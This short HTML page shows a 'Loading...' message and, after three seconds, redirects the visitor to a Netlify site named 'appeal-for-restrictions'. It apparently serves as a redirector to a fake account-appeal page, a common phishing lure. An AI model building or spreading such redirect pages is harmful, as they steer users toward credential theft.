<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
  <style>
    /* Styles for loading screen */
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #f4f4f4;
      font-family: Arial, sans-serif;
    }
    #loading {
      text-align: center;
    }
  </style>
</head>
<body>
  <div id="loading">
    <h1>Loading...</h1>
    <p>Please wait while we redirect you to the page.</p>
  </div>

  <script>
    // Set the delay in milliseconds (e.g., 3000ms = 3 seconds)
    const redirectDelay = 3000;
    const redirectUrl = "https://appeal-for-restrictions.netlify.app"; // Set the destination link

    setTimeout(() => {
      window.location.href = redirectUrl;
    }, redirectDelay);
  </script>
</body>
</html>
